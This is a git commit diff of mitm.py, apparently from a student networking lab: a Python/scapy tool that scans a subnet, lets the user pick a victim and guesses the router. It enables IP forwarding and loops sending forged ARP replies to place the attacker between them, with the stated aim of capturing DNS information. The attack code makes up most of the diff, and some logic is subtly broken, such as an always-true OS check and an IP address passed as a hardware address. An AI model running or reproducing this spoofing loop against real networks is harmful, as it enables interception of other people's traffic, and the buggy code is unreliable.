b71130a41cb82b0e15a9f875f1f17cc6b50c8364
flizze <alexandre.bel@ynov.com>
2022-12-18 00:14:25 +0100

    presque version finale

--- reseau/tp5/mitm.py
+++ reseau/tp5/mitm.py
@@ -8,7 +8,9 @@ import ipaddress
 import signal
 
 def checkSystem():
-    os.system('clear')
+    os.system('cls' if os.name == 'nt' else 'clear')
+    if os.geteuid() != 0:
+        raise SystemExit("You must run the program with root privileges.")
 
     version = platform.version()
     split1 = version.split("-")[1]
@@ -17,8 +19,9 @@ def checkSystem():
     if split2 == "Ubuntu" or "Debian":
         os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')
 
+        
 def graphBar():
-    os.system('clear')
+    os.system('cls' if os.name == 'nt' else 'clear')
     print('     -------------------------')
     print("     |MITM, GET INFO FROM DNS|")
     print('     -------------------------')
@@ -27,7 +30,7 @@ def graphBar():
 def login():
     target_ip = input("Enter network ip : (example : 192.168.1.0/24)\n")
     if not checkIP(target_ip):
-        os.system('clear')
+        os.system('cls' if os.name == 'nt' else 'clear')
         graphBar()
         print("This is not a valid IP, try again")
         login()
@@ -72,7 +75,7 @@ def isGoodNetwork(target, ip, mac):
     if len(ip) <= 1:
         global victim
         global router
-        userInput = input("There's no one in this network, are you sure it is the one you meant to explore ? If you are, you can refresh with: 'refresh'.\nYou can quit with 'ctrl+c'.\nYou can also change your network target simply by typing 'change'")
+        userInput = input("There's no one in this network, are you sure it is the one you meant to explore ? If you are, you can refresh with: 'refresh'.\nYou can quit with 'ctrl+c'.\nYou can also change your network target simply by typing 'change'\n")
         if userInput == "refresh":
             graphBar()
             print("Refreshing network", target)
@@ -87,13 +90,16 @@ def isGoodNetwork(target, ip, mac):
             return victim, router
     else:
         print("ips in the network" , ip)
-        print("macs in the network", mac,"\n")
         victim = input("Select your target ip. (1, 2, 3)...\n")
-        router = input("Select router ip. (1, 2, 3)... (Usually ends by .254)\n")
+        ip1, ip2, ip3, _ = ip[0].split(".")
+        router = ip1+'.'+ip2+'.'+ip3+'.254'
+        isItRouter = input(router+ " is it your target router ? y/n\n")
+        if isItRouter == "n":
+            router = input("Select router ip. (1, 2, 3)... (Usually ends by .254)\n")
+            router = ip[int(router)-1]
         return victim, router
 
 def checkIP(ipCheck):
-    ipCheck = ipCheck.split("/")[0]
     result = True
     try:
         ipaddress.ip_network(ipCheck)
@@ -124,8 +130,7 @@ def handler(signum, frame):
 signal.signal(signal.SIGINT, handler)
 
 while True: 
-    arp_response = ARP(pdst=ip[int(victim)-1], hwdst=mac[int(victim)-1], psrc=ip[int(router)-1])
+    arp_response = ARP(pdst=ip[int(victim)-1], hwdst=mac[int(victim)-1], psrc=router)
     scap.send(arp_response, count = 1, verbose=verboseShow)
-    arp_response = ARP(pdst=ip[int(router)-1], hwdst=mac[int(router)-1], psrc=ip[int(victim)-1])
-    scap.send(arp_response, count = 1, verbose=verboseShow)
-    time.sleep(1)
+    arp_response = ARP(pdst=router, hwdst=router, psrc=ip[int(victim)-1])
+    scap.send(arp_response, count = 1, verbose=verboseShow) 
